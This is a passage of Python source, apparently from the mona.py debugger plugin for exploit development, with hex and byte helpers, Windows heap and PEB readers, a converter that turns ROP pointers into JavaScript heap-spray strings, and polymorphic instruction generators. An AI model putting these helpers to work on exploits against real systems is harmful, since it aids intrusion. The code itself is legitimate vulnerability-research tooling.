	allocated_size = granularity * interimtimes
	
	return allocated_size
	


def getFunctionAddress(modname,funcname):
	"""
	Returns the addres of the function inside a given module
	Relies on EAT data
	Returns 0 if nothing found
	"""
	funcaddy = 0
	m = getModuleObj(modname)
	if not m == None:
		eatlist = m.getEAT()
		for f in eatlist:
			if funcname == eatlist[f]:
				return f
		for f in eatlist:
			if funcname.lower() == eatlist[f].lower():
				return f
	return funcaddy


def getFunctionName(addy):
	"""
	Returns symbol name closest to the specified address
	Only works in WinDBG
	Returns function name and optional offset
	"""
	fname = ""
	foffset = ""
	cmd2run = "ln %s" % (PTR_PRINT % addy)
	output = dbg.nativeCommand(cmd2run)
	for line in output.split("\n"):
		if "|" in line:
			lineparts = line.split(" ")
			partcnt = 0
			for p in lineparts:
				if not p == "":
					if partcnt == 1:
						fname = p
						break
					partcnt += 1
	if "+" in fname:
		fnameparts = fname.split("+")
		if len(fnameparts) > 1:
			return fnameparts[0],fnameparts[1]
	return fname,foffset



def printDataArray(data,charsperline=16,prefix=b""):
	maxlen = len(data)
	charcnt = 0
	charlinecnt = 0
	linecnt = 0
	thisline = prefix
	lineprefix = "%04d - %04d " % (charcnt,charcnt+charsperline-1)
	thisline += lineprefix
	while charcnt < maxlen:
		thisline += data[charcnt:charcnt+1]
		charlinecnt += 1
		charcnt += 1
		if charlinecnt == charsperline or charlinecnt == maxlen:
			dbg.log(thisline)
			thisline = prefix
			lineprefix = "%04d - %04d " % (charcnt,charcnt+charsperline-1)
			thisline += lineprefix
			charlinecnt = 0
	return None


def find_all_copies(tofind,data):
	"""
	Finds all occurences of a string in a longer string

	Arguments:
	tofind - the string to find
	data - contains the data to look for all occurences of 'tofind'

	Return:
	An array with all locations
	"""
	position = 0
	positions = []
	searchstringlen = len(tofind)
	maxlen = len(data)
	while position < maxlen:
		position = data.find(tofind,position)
		if position == -1:
			break
		positions.append(position)
		position += searchstringlen
	return positions

def getAllStringOffsets(data,minlen,offsetstart = 0):
	asciistrings = {}
	data = ensure_text(data)
	for match in re.finditer("(([\x20-\x7e]){%d,})" % minlen,data): 
		thisloc = match.start() + offsetstart
		thisend = match.end() + offsetstart
		asciistrings[thisloc] = thisend
	return asciistrings

def getAllUnicodeStringOffsets(data,minlen,offsetstart = 0):
	unicodestrings = {}
	if not isinstance(data, bytes):
		data = data.encode('latin-1')
	for match in re.finditer(b"((\x00[\x20-\x7e]){%d,})" % (minlen*2),data):
		unicodestrings[offsetstart + match.start()] = (offsetstart + match.end())
	return unicodestrings


def stripExtension(fullname):
	"""
	Removes extension from a filename
	(will only remove the last extension)

	Arguments :
	fullname - the original string

	Return:
	A string, containing the original string without the last extension
	"""
	nameparts = str(fullname).split(".")
	if len(nameparts) > 1:
		cnt = 0
		modname = ""
		while cnt < len(nameparts)-1:
			modname = modname + nameparts[cnt] + "."
			cnt += 1
		return modname.strip(".")
	return fullname


def toHexByte(n):
	"""
	Converts a numeric value to a hex byte

	Arguments:
	n - the vale to convert (max 255)

	Return:
	A string, representing the value in hex (1 byte)
	"""
	return "%02X" % n

def toAsciiOnly(inputstr):
	return "".join(i for i in inputstr if _ord(i)<128 and _ord(i) > 31)

def toAscii(n):
	"""
	Converts a byte to its ascii equivalent. Null byte = space

	Arguments:
	n - A string (2 chars) representing the byte to convert to ascii

	Return:
	A string (one character), representing the ascii equivalent
	"""
	asciiequival = " "
	if n.__class__.__name__ == "int":
		n = "%02x" % n
	try:
		if n != "00":
			asciiequival=binascii.a2b_hex(n).decode("latin1")
		else:
			asciiequival = " "
	except TypeError:
		asciiequival=" "
	return asciiequival

def hex2bin(pattern):
	"""
	Converts a hex string (\\x??\\x??\\x??\\x??) to real hex bytes

	Arguments:
	pattern - A string representing the bytes to convert 

	Return:
	the bytes
	"""
	pattern = pattern.replace("\\x", "")
	pattern = pattern.replace("0x", "")
	pattern = pattern.replace("`", "")
	pattern = pattern.replace("\"", "")
	pattern = pattern.replace("\'", "")
		
	return ensure_bytes(''.join([_to_text(binascii.a2b_hex(i+j)) for i,j in zip(pattern[0::2],pattern[1::2])]))


def normalizeHexBytesArg(pattern):
	"""
	Normalize a user-provided byte string into a pure hex string (no separators).

	Accepted examples:
	  - "\\x41\\x42"
	  - "0x41,0x42"
	  - "41 42"
	  - "4142"

	Return:
	  - normalized hex string (e.g. "4142") for byte inputs
	  - "" for empty input
	  - None if the input doesn't look like bytes
	"""
	if pattern is None:
		return ""

	try:
		txt = _to_text(pattern)
	except:
		try:
			txt = text_type(pattern)
		except:
			return None

	txt = txt.strip()
	if txt == "":
		return ""

	# Strip optional Python bytes literal prefix: b".." / b'..'
	if len(txt) >= 2 and txt[0] in ("b", "B") and txt[1] in ("'", '"'):
		txt = txt[1:]

	txt = txt.replace('"', '').replace("'", "")
	# Remove common separators
	txt = re.sub(r'[\s,]', '', txt)
	# Allow \xNN and 0xNN formats
	txt = re.sub(r'(?i)\\x', '', txt)
	txt = re.sub(r'(?i)0x', '', txt)

	if txt == "":
		return ""

	if not re.match(r'(?i)^[0-9a-f]+$', txt):
		return None
	if (len(txt) % 2) != 0:
		return None

	return txt

def cleanHex(hex):
	hex = hex.replace("'","")
	hex = hex.replace('"',"")
	hex = hex.replace("\\x","")
	hex = hex.replace("0x","")
	return hex

def hex2int(hex):
	return int(hex,16)

def getVariantType(typenr):
	varianttypes = {}
	varianttypes[0x0] = "VT_EMPTY"
	varianttypes[0x1] = "VT_NULL"
	varianttypes[0x2] = "VT_I2"
	varianttypes[0x3] = "VT_I4"
	varianttypes[0x4] = "VT_R4"
	varianttypes[0x5] = "VT_R8"
	varianttypes[0x6] = "VT_CY"
	varianttypes[0x7] = "VT_DATE"
	varianttypes[0x8] = "VT_BSTR"
	varianttypes[0x9] = "VT_DISPATCH"
	varianttypes[0xA] = "VT_ERROR"
	varianttypes[0xB] = "VT_BOOL"
	varianttypes[0xC] = "VT_VARIANT"
	varianttypes[0xD] = "VT_UNKNOWN"
	varianttypes[0xE] = "VT_DECIMAL"
	varianttypes[0x10] = "VT_I1"
	varianttypes[0x11] = "VT_UI1"
	varianttypes[0x12] = "VT_UI2"
	varianttypes[0x13] = "VT_UI4"
	varianttypes[0x14] = "VT_I8"
	varianttypes[0x15] = "VT_UI8"
	varianttypes[0x16] = "VT_INT"
	varianttypes[0x17] = "VT_UINT"
	varianttypes[0x18] = "VT_VOID"
	varianttypes[0x19] = "VT_HRESULT"
	varianttypes[0x1A] = "VT_PTR"
	varianttypes[0x1B] = "VT_SAFEARRAY"
	varianttypes[0x1C] = "VT_CARRAY"
	varianttypes[0x1D] = "VT_USERDEFINED"
	varianttypes[0x1E] = "VT_LPSTR"
	varianttypes[0x1F] = "VT_LPWSTR"
	varianttypes[0x24] = "VT_RECORD"
	varianttypes[0x25] = "VT_INT_PTR"
	varianttypes[0x26] = "VT_UINT_PTR"
	varianttypes[0x2000] = "VT_ARRAY"
	varianttypes[0x4000] = "VT_BYREF"

	if typenr in varianttypes:
		return varianttypes[typenr]
	else:
		return ""



def bin2hex(binbytes):
	"""
	Converts bytes/bytearray/str/int to a hex string
	Py2/Py3 compatible
	"""
	if binbytes is None:
		return ""

	# allow a single integer byte too
	if isinstance(binbytes, int):
		return "%02x" % (binbytes & 0xff)

	out = []
	for c in binbytes:
		if isinstance(c, int):
			out.append("%02x" % (c & 0xff))
		else:
			out.append("%02x" % _ord(c))
	return ' '.join(out)


def yesno():
	"""Return a random boolean, favoring False roughly 3:1."""
	return random.randint(1, 4) == 4


def fileToBin(filename):
	"""
	Read a file and return an array (list) of byte values (0-255).
	Py2/Py3 compatible.
	"""
	bytearray_content = []
	clean_filename = _to_text(filename).replace("'", "").replace('"', "")

	dbgp("fileToBin() reading file: %s" % clean_filename)

	if not os.path.isfile(clean_filename):
		dbgp("fileToBin() error: file does not exist: %s" % clean_filename, highlight=True)
		return bytearray_content

	try:
		with open(clean_filename, "rb") as infile:
			content = infile.read()
		bytearray_content = [_ord(c) for c in content]
		dbgp("fileToBin() read %d bytes from %s" % (len(bytearray_content), clean_filename))
	except Exception as e:
		dbgp("fileToBin() error reading %s: %s" % (clean_filename, str(e)), highlight=True, errormode=False)
		return []

	return bytearray_content


def bin2hexstr(binbytes):
	"""
	Converts bytes to a string with hex
	
	Arguments:
	binbytes - the input to convert to hex
	
	Return :
	string with hex
	"""
	return ''.join('\\x%02x' % _ord(c) for c in binbytes)


def str2js(inputstring):
	"""
	Converts a byte string to a javascript string
	
	Arguments:
	inputstring - the input bytes to convert

	Return:
	string in javascript format
	"""
	inputbytes = _to_bytes(inputstring)
	length = len(inputbytes)

	if length % 2 == 1:
		jsmsg = "Warning : odd size given, js pattern will be truncated to " + str(length - 1) + " bytes, it's better use an even size\n"
		if not silent:
			dbg.logLines(jsmsg, highlight=1)

	toreturn = ""
	for i in range(0, length - 1, 2):
		thisunibyte = "%02x%02x" % (_ord(inputbytes[i + 1]), _ord(inputbytes[i]))
		toreturn += "%u" + thisunibyte

	return toreturn


def readJSONDict(filename):
	"""
	Retrieve stored dict from JSON file
	"""
	jsondict = {}
	with open(filename, 'rb') as infile:
		jsondata = infile.read()
		jsondict = json.loads(_to_text(jsondata))
	return jsondict


def writeJSONDict(filename, dicttosave):
	"""
	Write dict as JSON to file
	"""
	with open(filename, 'wb') as outfile:
		outfile.write(_to_bytes(json.dumps(dicttosave)))
	return


def readPickleDict(filename):
	"""
	Retrieve stored dict from file (pickle load)
	"""
	pdict = {}
	pdict = pickle.load( open(filename,"rb"))
	return pdict

def writePickleDict(filename, dicttosave):
	"""
	Write a dict to file as a pickle
	"""
	pickle.dump(dicttosave, open(filename, "wb"))
	return

	
def opcodesToHex(opcodes):
	"""
	Converts pairs of chars (opcode bytes) to hex string notation

	Arguments :
	opcodes : pairs of chars
	
	Return :
	string with hex
	"""
	toreturn = []
	opcodes = opcodes.replace(" ","")
	
	for cnt in range(0, len(opcodes), 2):
		thisbyte = opcodes[cnt:cnt+2]
		toreturn.append("\\x" + thisbyte)
	toreturn = ''.join(toreturn)
	return toreturn
	
	
def rmLeading(input,toremove,toignore=""):
	"""
	Removes leading characters from an input string
	
	Arguments:
	input - the input string
	toremove - the character to remove from the begin of the string
	toignore - ignore this character
	
	Return:
	the input string without the leading character(s)
	"""
	newstring = ""
	cnt = 0
	while cnt < len(input):
		if input[cnt] != toremove and input[cnt] != toignore:
			break
		cnt += 1
	newstring = input[cnt:]
	return newstring

	
def getVersionInfo(filename):
	"""Retrieves version and revision numbers from a mona file
	
	Arguments : filename
	
	Return :
	version - string with version (normalized)
	revision - string with revision (normalized as int string)
	"""

	file = open(filename,"rb")
	content = file.readlines()
	file.close()

	
	revision = ""
	version = ""
	for line in content:
		# Py2/Py3 compatibility: ensure line is text
		if not isinstance(line, str):
			line = line.decode("utf-8", "ignore")	
		if line.startswith("$Revision"):
			parts = line.split(" ")
			if len(parts) > 1:
				revision = parts[1].replace("$","")
		if line.startswith("__VERSION__"):
			parts = line.split("=")
			if len(parts) > 1:
				version = parts[1].strip()

	# Normalize version and revision
	def _normalize_version(v):
		if v is None:
			return ""
		v = str(v).strip().replace("'", "").replace('"', "")
		return v

	version = _normalize_version(version)
	revision = str(_safe_int(revision))

	return version,revision

	
def toniceHex(data,size):
	"""
	Converts a series of bytes into a hex string, 
	newline after 'size' nr of bytes
	
	Arguments :
	data - the bytes to convert
	size - the number of bytes to show per linecache
	
	Return :
	a multiline string
	"""
	flip = 1
	thisline = "\""
	block = ""

	try:
   		 # Python 2
		xrange
	except NameError:
		# Python 3, xrange is now named range
		xrange = range
	
	for cnt in xrange(len(data)):
		thisline += "\\x%s" % toHexByte(_ord(data[cnt]))				
		if (flip == size) or (cnt == len(data)-1):				
			thisline += "\""
			flip = 0
			block += thisline 
			block += "\n"
			thisline = "\""
		cnt += 1
		flip += 1
	return block.lower()
	
def hexStrToInt(inputstr):
	"""
	Converts a string with hex bytes to a numeric value
	Arguments:
	inputstr - A string representing the bytes to convert. Example : 41414141

	Return:
	the numeric value
	"""
	valtoreturn = 0
	try:
		inputstr = str(inputstr).strip().lower()
		sign = 1
		if inputstr.startswith("-"):
			sign = -1
			inputstr = inputstr[1:].strip()
		elif inputstr.startswith("+"):
			inputstr = inputstr[1:].strip()
		if inputstr.startswith("0x"):
			inputstr = inputstr[2:]
		if inputstr.endswith("h"):
			inputstr = inputstr[:-1]
		if len(inputstr) > 0:
			valtoreturn = sign * int(inputstr, 16)
	except:
		valtoreturn = 0
	return valtoreturn

def to_int(inputstr):
	"""
	Converts a string to int, whether it's hex or decimal
	Arguments:
	    inputstr - A string representation of a number. Example: 0xFFFF, 2345

	Return:
	    the numeric value
	"""
	if str(inputstr).lower().startswith("0x"):
		return hexStrToInt(inputstr)
	else:
		return int(inputstr)
	
def toSize(toPad,size):
	"""
	Adds spaces to a string until the string reaches a certain length

	Arguments:
	input - A string
	size - the destination size of the string 

	Return:
	the expanded string of length <size>
	"""
	padded = toPad + " " * (size - len(toPad))
	return padded.ljust(size," ")

	
def toUnicode(input):
	"""
	Converts a series of bytes to unicode (UTF-16) bytes
	
	Arguments :
	input - the source bytes
	
	Return:
	the unicode expanded version of the input
	"""
	unicodebytes = ""
	# try/except, just in case .encode bails out
	try:
		unicodebytes = _to_text(input.encode('UTF-16LE'))
	except:
		inputlst = list(input)
		for inputchar in inputlst:
			unicodebytes += inputchar + '\x00'
	return unicodebytes
	
def toJavaScript(input):
	"""
	Extracts pointers from lines of text
	and returns a javascript friendly version
	"""
	alllines = input.split("\n")
	javascriptversion = ""
	allbytes = b""
	for eachline in alllines:
		thisline = eachline.replace("\t","").lower().strip()
		if not(thisline.startswith("#")):
			if thisline.startswith("0x"):
				theptr = thisline.split(",")[0].replace("0x","")
				# change order to unescape format
				if arch == 32:
					ptrstr = ""
					byte1 = theptr[0] + theptr[1]
					ptrstr = "\\x" + byte1
					byte2 = theptr[2] + theptr[3]
					ptrstr = "\\x" + byte2 + ptrstr
					try:
						byte3 = theptr[4] + theptr[5]
						ptrstr = "\\x" + byte3 + ptrstr
					except:
						pass
					try:
						byte4 = theptr[6] + theptr[7]
						ptrstr = "\\x" + byte4 + ptrstr
					except:
						pass
					allbytes += hex2bin(ptrstr)
				if arch == 64:
					byte1 = theptr[0] + theptr[1]
					byte2 = theptr[2] + theptr[3]
					byte3 = theptr[4] + theptr[5]
					byte4 = theptr[6] + theptr[7]
					byte5 = theptr[8] + theptr[9]
					byte6 = theptr[10] + theptr[11]
					byte7 = theptr[12] + theptr[13]
					byte8 = theptr[14] + theptr[15]
					allbytes += hex2bin("\\x" + byte8 + "\\x" + byte7 + "\\x" + byte6 + "\\x" + byte5)
					allbytes += hex2bin("\\x" + byte4 + "\\x" + byte3 + "\\x" + byte2 + "\\x" + byte1)
	javascriptversion = str2js(allbytes)			
	return javascriptversion
	

def getSourceDest(instruction):
	"""
	Determines source and destination register for a given instruction
	"""
	src = []
	dst = []
	srcp = []
	dstp = []
	srco = []
	dsto = []
	instr = []
	haveboth = False
	seensep = False
	seeninstr = False

	regs = getAllRegs()

	instructionparts = multiSplit(instruction,[" ",","])
	
	if "," in instructionparts:
		haveboth = True

	delkeys = ["dword","ptr","byte"]

	for d in delkeys:
		if d in instructionparts:
			instructionparts.remove(d)


	for p in instructionparts:

		regfound = False
		for r in regs:
			if r.lower() in p.lower() and not "!" in p and not len(instr) == 0:
				regfound = True
				seeninstr = True
				break

		if not regfound:
			if not seeninstr and not seensep:
				instr.append(p) 
		
			if "," in p:
				seensep = True
		else:
			for r in regs:
				if r.lower() in p.lower():
					if not seensep or not haveboth:
						dstp.append(p)
						if not r in dsto:
							dsto.append(r)
							break
					else:
						srcp.append(p)
						if not r in srco:
							srco.append(r)
							break

	#dbg.log("dst: %s" % dsto)
	#dbg.log("src: %s" % srco)
	src = srcp
	dst = dstp
	return src,dst

	

def getAllRegs():
	"""
	Return an array with all 64bit, 32bit, 16bit and 8bit registers
	(depending on the current architecture)
	"""

	regs = []
	if arch == 64:
		regs = Registers64BitsOrder[:] + Registers32BitsOrder[:]
		regs.append("r8d")
		regs.append("r9d")
		regs.append("r10d")
		regs.append("r11d")
		regs.append("r12d")
		regs.append("r13d")
		regs.append("r14d")
		regs.append("r15d")

	if arch == 32:
		regs = Registers32BitsOrder[:] 
	
	regs.append("ax")
	regs.append("bx")
	regs.append("cx")
	regs.append("dx")
	regs.append("bp")
	regs.append("sp")
	regs.append("si")
	regs.append("di")
	regs.append("al")
	regs.append("ah")
	regs.append("bl")
	regs.append("bh")
	regs.append("cl")
	regs.append("ch")
	regs.append("dl")
	regs.append("dh")
	return regs

def getSmallerRegs(reg):

	if reg == "eax":
		return ["ax","al","ah"]
	if reg == "ax":
		return ["al","ah"]
	if reg == "ebx":
		return ["bx","bl","bh"]
	if reg == "bx":
		return ["bl","bh"]
	if reg == "ecx":
		return ["cx","cl","ch"]
	if reg == "cx":
		return ["cl","ch"]
	if reg == "edx":
		return ["dx","dl","dh"]
	if reg == "dx":
		return ["dl","dh"]
	if reg == "esp":
		return ["sp"]
	if reg == "ebp":
		return ["bp"]
	if reg == "esi":
		return ["si"]
	if reg == "edi":
		return ["di"]

	return []


def isReg(reg):
	"""
	Checks if a given string is a valid reg
	Argument :
	reg  - the register to check
	
	Return:
	Boolean
	"""
	regs = []
	if arch == 32:
		regs = Registers32BitsOrder
	if arch == 64:
		regs = Registers64BitsOrder
	return str(reg).lower() in regs
	

def isAddress(string):
	"""
	Check if a string is an address / consists of hex chars only

	Arguments:
	string - the string to check

	Return:
	Boolean - True if the address string only contains hex bytes
	"""
	string = string.replace("\\x","")
	if len(string) > 16:
		return False
	for char in string:
		if char.upper() not in ["A","B","C","D","E","F","1","2","3","4","5","6","7","8","9","0"]:
			return False
	return True
	
def isHexValue(string):
	"""
	Check if a string is a hex value / consists of hex chars only (and - )

	Arguments:
	string - the string to check

	Return:
	Boolean - True if the address string only contains hex bytes or - sign
	"""
	string = string.replace("\\x","")
	string = string.replace("0x","")
	if len(string) > 16:
		return False
	for char in string:
		if char.upper() not in ["A","B","C","D","E","F","1","2","3","4","5","6","7","8","9","0","-"]:
			return False
	return True	

def Poly_ReturnDW(value):
	I = random.randint(1, 3)
	if I == 1:
		if random.randint(1, 2) == 1:
			return dbg.assemble( "sub eax,eax\n add eax,0x%08x" % value )
		else:
			return dbg.assemble( "sub eax,eax\n add eax,-0x%08x" % value )
	if I == 2:
		return dbg.assemble( "push 0x%08x\n pop eax\n" % value )
	if I == 3:
		if random.randint(1, 2) == 1:
			return dbg.assemble( "xchg eax,edi\n db 0xBF\n dd 0x%08x\n xchg eax,edi" % value )
		else:
			return dbg.assemble( "xchg eax,edi\n mov edi,0x%08x\n XCHG eax,edi" % value )
	return

def Poly_Return0():
	I = random.randint(1, 4)
	if I == 1:
		return dbg.assemble( "sub eax,eax" )
	if I == 2:
		if random.randint(1, 2) == 1:
			return dbg.assemble( "push 0\n pop eax" )
		else:
			return dbg.assemble( "db 0x6A,0x00\n pop eax" )
	if I == 3:
		return dbg.assemble( "xchg eax,edi\n sub edi,edi\n xchg eax,edi" )
	if I == 4:
		return Poly_ReturnDW(0)
	return


def addrToInt(string):
	"""
	Convert a textual address to an integer

	Arguments:
	string - the address

	Return:
	int - the address value
	"""
	
	string = string.replace("\\x","")
	return hexStrToInt(string)
	
def splitAddress(address):
	"""
	Splits aa dword/qdword into individual bytes (4 or 8 bytes)

	Arguments:
	address - The string to split

	Return:
	4 or 8 bytes
	"""
	if arch == 32:
		byte1 = address >> 24 & 0xFF
		byte2 = address >> 16 & 0xFF
		byte3 = address >>  8 & 0xFF
		byte4 = address & 0xFF
		return byte1,byte2,byte3,byte4

	if arch == 64:
		byte1 = address >> 56 & 0xFF
		byte2 = address >> 48 & 0xFF
		byte3 = address >> 40 & 0xFF
		byte4 = address >> 32 & 0xFF
		byte5 = address >> 24 & 0xFF
		byte6 = address >> 16 & 0xFF
		byte7 = address >>  8 & 0xFF
		byte8 = address & 0xFF
		return byte1,byte2,byte3,byte4,byte5,byte6,byte7,byte8


def bytesInRange(address, range):
	"""
	Checks if all bytes of an address are in a range

	Arguments:
	address - the address to check
	range - a range object containing the values all bytes need to comply with

	Return:
	a boolean
	"""
	if arch == 32:
		byte1,byte2,byte3,byte4 = splitAddress(address)
		
		# if the first is a null we keep the address anyway
		if not (byte1 == 0 or byte1 in range):
			return False
		elif not byte2 in range:
			return False
		elif not byte3 in range:
			return False
		elif not byte4 in range:
			return False

	if arch == 64:
		byte1,byte2,byte3,byte4,byte5,byte6,byte7,byte8 = splitAddress(address)
		
		# if the first is a null we keep the address anyway
		if not (byte1 == 0 or byte1 in range):
			return False
		elif not byte2 in range:
			return False
		elif not byte3 in range:
			return False
		elif not byte4 in range:
			return False
		elif not byte5 in range:
			return False
		elif not byte6 in range:
			return False
		elif not byte7 in range:
			return False
		elif not byte8 in range:
			return False
	
	return True

def readString(address):
	"""
	Reads a string from the given address until it reaches a null bytes

	Arguments:
	address - the base address (integer value)

	Return:
	the string
	"""
	toreturn = dbg.readString(address)
	return toreturn

def getSegmentEnd(segmentstart):
	os = dbg.getOsVersion()
	offset = 0x24
	if win7mode:
		offset = 0x28
	segmentend = struct.unpack(PTR_FMT,dbg.readMemory(segmentstart + offset,PTR_SIZE))[0]
	return segmentend


def getHeapFlag(flag):
	flags = {
	0x0 : "Free",
	0x1 : "Busy",
	0x2 : "Extra present",
	0x4 : "Fill pattern",
	0x8 : "Virtallocd",
	0x10 : "Last",
	0x20 : "Internal/FFU-1",
	0x40 : "Internal/FFU-2",
	0x80 : "Internal/No Coalesce"
	}
	#if win7mode:
	#	flags[0x8] = "Internal"
	if flag in flags:
		return flags[flag]
	else:
		# maybe it's a combination of flags
		values = [0x80, 0x40, 0x20, 0x10, 0x8, 0x4, 0x2, 0x1]
		flagtext = []
		for val in values:
			if (flag - val) >= 0:
				flagtext.append(flags[val])
				flag -= val
		if len(flagtext) == 0:
			flagtext = "Unknown"
		else:
			flagtext = ','.join(flagtext)
		return flagtext

def decodeHeapHeader(headeraddress,headersize,key):
	# get header and XOR first 8 bytes with encoding key (_HEAP_ENTRY sized)
	# Always read in 4-byte chunks: _HEAP_ENTRY fields are WORD/BYTE-sized, not
	# pointer-sized. Reading PTR_SIZE (8) bytes on x64 produces a 16-char hex
	# string but the inner loop only processes 8 chars, silently discarding half
	# the header and producing corrupt field values.
	key_size = 8
	blockcnt = 0
	fullheaderbytes = ""
	decodedheader = ""
	fullheaderbytes = ""
	while blockcnt < headersize:
		header = struct.unpack('<L',dbg.readMemory(headeraddress+blockcnt,4))[0]
		if blockcnt < key_size:
			# extract the corresponding 4 bytes of the key
			key_dword = (key >> (blockcnt * 8)) & 0xFFFFFFFF
			decodedheader = header ^ key_dword
		else:
			decodedheader = header
		headerbytes = "%08x" % decodedheader
		bytecnt = 7
		while bytecnt >= 0:
			fullheaderbytes = fullheaderbytes + headerbytes[bytecnt-1] + headerbytes[bytecnt]
			bytecnt -= 2
		blockcnt += 4
	return hex2bin(fullheaderbytes)

def walkSegment(FirstEntry,LastValidEntry,heapbase):
	"""
	Finds all chunks in a given segment

	Arguments : Start and End of segment, and heapbase
	

	Returns a dictionary of MnChunk objects
	Key : chunk pointer

	"""
	mHeap = MnHeap(heapbase)
	mSegment = MnSegment(heapbase,FirstEntry,LastValidEntry)
	return mSegment.getChunks()

	
def getStacks():
	"""
	Retrieves all stacks from all threads in the current application

	Arguments:
	None

	Return:
	a dictionary, with key = threadID. Each entry contains an array with base and top of the stack
	"""
	_ensureMnProc(entities=["threads"])
	if len(mnproc.stacklistCache) > 0:
		return mnproc.stacklistCache
	stacks = {}
	for tid, teb in mnproc.getThreads().items():
		stacks[tid] = [teb.StackLimit, teb.StackBase]
	mnproc.stacklistCache = stacks
	return stacks

def meetsAccessLevel(page,accessLevel):
	"""
	Checks if a given page meets a given access level

	Arguments:
	page - a page object
	accesslevel - a string containing one of the following access levels :
	R,W,X,RW,RX,WR,WX,RWX or *

	Return:
	a boolean
	"""
	if "*" in accessLevel:
		return True
	
	pageAccess = page.getAccess(human=True)
	
	if "-R" in accessLevel:
		if "READ" in pageAccess:
			return False
	if "-W" in accessLevel:
		if "WRITE" in pageAccess:
			return False
	if "-X" in accessLevel:
		if "EXECUTE" in pageAccess:
			return False
	if "R" in accessLevel:
		if not "READ" in pageAccess:
			return False
	if "W" in accessLevel:
		if not "WRITE" in pageAccess:
			return False
	if "X" in accessLevel:
		if not "EXECUTE" in pageAccess:
			return False
			
	return True

def splitToPtrInstr(input):
	"""
	Splits a line (retrieved from a mona output file) into a pointer and a string with the instructions in the file

	Arguments:
	input : the line containing pointer and instruction

	Return:
	a pointer - (integer value)
	a string - instruction
	if the input does not contain a valid line, pointer will be set to -1 and string will be empty
	"""	
	
	thispointer = -1
	thisinstruction = ""
	
	# Some mona output lines may be indented; don't require the pointer to be at column 0.
	thisline = input.lower()
	thisline_stripped = thisline.lstrip()
	input_stripped = input.lstrip()
	is_bytes = isinstance(thisline, bytes)
	
	# Skip comment lines and lines without instruction separator
	if is_bytes:
		if thisline_stripped.startswith(b"#"):
			return thispointer, thisinstruction
		# Gadget/instruction lines use " : " (space-colon-space) as separator.
		if b" : " not in input_stripped:
			return thispointer, thisinstruction
	else:
		if thisline_stripped.startswith("#"):
			return thispointer, thisinstruction
		# Gadget/instruction lines use " : " (space-colon-space) as separator.
		if " : " not in input_stripped:
			return thispointer, thisinstruction
	
	# Create appropriate patterns based on input type
	if is_bytes:
		split1 = re.compile(b" ")
		split2 = re.compile(b":")
		split3 = re.compile(br"\*\*")
		startswith_arg = b"0x"
		newline_arg = b"\n"
		carriage_arg = b"\r"
		colon_arg = b":"
		ptr_re = re.compile(br"^0x[0-9a-f]{8,16}$")
	else:
		split1 = re.compile(" ")
		split2 = re.compile(":")
		split3 = re.compile(r"\*\*")
		startswith_arg = "0x"
		newline_arg = "\n"
		carriage_arg = "\r"
		colon_arg = ":"
		ptr_re = re.compile(r"^0x[0-9a-f]{8,16}$")
	
	if thisline_stripped.startswith(startswith_arg):
		#get the pointer
		parts = split1.split(input_stripped)
		dbgp("Parts: %s" % parts)
		part1 = parts[0].replace(newline_arg, b"" if is_bytes else "").replace(carriage_arg, b"" if is_bytes else "")
		part1_lc = part1.lower()
		# Accept both 32-bit (8 hex digits) and 64-bit (up to 16 hex digits) pointers.
		if not ptr_re.match(part1_lc):
			return thispointer, thisinstruction
		else:
			thispointer = hexStrToInt(part1)
			if len(parts) > 1:
				subparts = split2.split(input_stripped)
				subpartsall = b"" if is_bytes else ""
				if len(subparts) > 1:
					cnt = 1
					while cnt < len(subparts):
						subpartsall += subparts[cnt] + colon_arg
						cnt += 1
					subsubparts = split3.split(subpartsall)
					thisinstruction = subsubparts[0].strip()
			return thispointer, thisinstruction
	else:
		return thispointer, thisinstruction

def getNrOfDictElements(thisdict):
	"""
	Will get the total number of entries in a given dictionary
	Argument: the source dictionary
	Output : an integer
	"""
	total = 0
	for dicttype in thisdict:
		for dictval in thisdict[dicttype]:
			total += 1
	return total

def get_teb_addr():
	"""
	Return the TEB address for the current thread.
	Cached at mona level (_teb_addr_cache) and at the windbglib Debugger
	instance level (self._teb_addr).
	"""
	global _teb_addr_cache
	if _teb_addr_cache is not None:
		return int(_teb_addr_cache)
	try:
		_teb_addr_cache = dbg.get_teb_addr()
	except Exception:
		# Fallback for Immunity: use current thread's TEB directly
		try:
			tid = dbg.getThreadId()
			thread = dbg.getAllThreads()[tid]
			_teb_addr_cache = thread.getTEB()
			if _teb_addr_cache is None:
				_teb_addr_cache = 0
		except Exception:
			_teb_addr_cache = 0
	if _teb_addr_cache is None:
		_teb_addr_cache = 0
	return int(_teb_addr_cache)


class MnPEB:
	"""
	Class representing the Process Environment Block (PEB).
	Reads fields directly from memory using the cached PEB address.
	"""

	# PEB field offsets: (offset_x86, offset_x64)
	_offsets = {
		"ImageBaseAddress":     (0x08, 0x10),
		"Ldr":                  (0x0C, 0x18),
		"ProcessParameters":    (0x10, 0x20),
		"ProcessHeap":          (0x18, 0x30),
		"NumberOfHeaps":        (0x88, 0xE8),
		"MaximumNumberOfHeaps": (0x8C, 0xEC),
		"ProcessHeaps":         (0x90, 0xF0),
		"OSMajorVersion":       (0xA4, 0x118),
		"OSMinorVersion":       (0xA8, 0x11C),
		"OSBuildNumber":        (0xAC, 0x120),
	}

	# PEB_LDR_DATA list head offsets: (x86, x64)
	_ldr_list_info = {
		"InLoadOrderModuleList": {
			"head_offset": (0x0C, 0x10),
			"link_offset": (0x00, 0x00),
		},
		"InMemoryOrderModuleList": {
			"head_offset": (0x14, 0x20),
			"link_offset": (0x08, 0x10),
		},
		"InInitializationOrderModuleList": {
			"head_offset": (0x1C, 0x30),
			"link_offset": (0x10, 0x20),
		},
	}

	# LDR_DATA_TABLE_ENTRY field offsets: (x86, x64)
	_dll_base_off   = (0x18, 0x30)
	_full_name_off  = (0x24, 0x48)
	_base_name_off  = (0x2C, 0x58)

	# Class-level cache: list_name -> [(dll_base, base_name, full_path), ...]
	_raw_cache = {}

	# Architecture index: 0 for x86, 1 for x64
	_arch_index = 1 if arch == 64 else 0

	# TODO: move part of procHideDebug here, we want patching to be done via MnPEB
	def __init__(self):
		self.PEBAddress = MnPEB.get_address()
		if self.PEBAddress == 0:
			raise Exception("Unable to determine PEB address")

		def _read_ptr(addr):
			return struct.unpack(PTR_FMT, dbg.readMemory(addr, PTR_SIZE))[0]

		def _read_dword(addr):
			return struct.unpack('<L', dbg.readMemory(addr, 4))[0]

		peb = self.PEBAddress

		self.ImageBaseAddress     = _read_ptr(peb + self._offsets["ImageBaseAddress"][self._arch_index])
		self.Ldr                  = _read_ptr(peb + self._offsets["Ldr"][self._arch_index])
